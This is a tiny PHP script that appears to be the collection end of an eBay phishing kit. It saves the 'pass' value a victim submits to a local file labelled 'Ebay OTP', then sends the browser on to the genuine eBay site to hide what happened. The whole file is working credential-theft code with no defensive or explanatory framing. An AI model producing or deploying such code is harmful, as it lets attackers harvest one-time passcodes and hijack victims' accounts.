<?php
file_put_contents("otp.txt", "Ebay OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.ebay.com/');
?>
